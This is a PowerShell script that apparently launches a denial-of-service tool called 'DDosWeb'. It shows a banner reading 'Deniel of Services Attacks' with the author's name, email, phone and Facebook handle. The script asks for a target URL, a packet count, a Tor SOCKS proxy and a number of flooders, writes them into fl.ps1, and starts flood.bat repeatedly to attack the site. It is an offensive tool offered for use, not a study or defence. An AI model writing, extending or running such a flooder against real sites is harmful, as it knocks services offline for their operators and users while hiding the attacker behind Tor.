while ($true)
{
while ($true)
{
CLS
[console]::Title = "DDosWeb"
write-host '
                               _            
 ______                       (ervices      
(  __  \         _  Deniel of _)            
| (  \  \       | |          _____          
| |   )  )      | |   ___   / ____)         
| |   |  |  ____| |  / _ \ ( (____         
| |   )  ) / _____| | | | | \____ \         
| (__/  / ( (_____  | |_| |  ____) )        
(______/   \______)  \___/  (_____/ATTACKS 

 by natnael wubet
 email : natyw4122@gmail.com
 phone : +251941226507
 facebook : naty.wubet

' -ForegroundColor Yellow


[uri] $ur = Read-Host -Prompt "Url"
[int] $num = Read-Host -Prompt "number of package"
[uri] $tor = read-host "Tor socks proxy"
[int] $atts = read-host "Number of Flooders"
"[uri]`$ur = ""$($ur)"";[int]`$num = ""$($num)"";[uri]`$tor=""$($tor)""">fl.ps1
while ($atts -ge 1)
{
	start flood.bat
	$atts=$atts-1
}
}
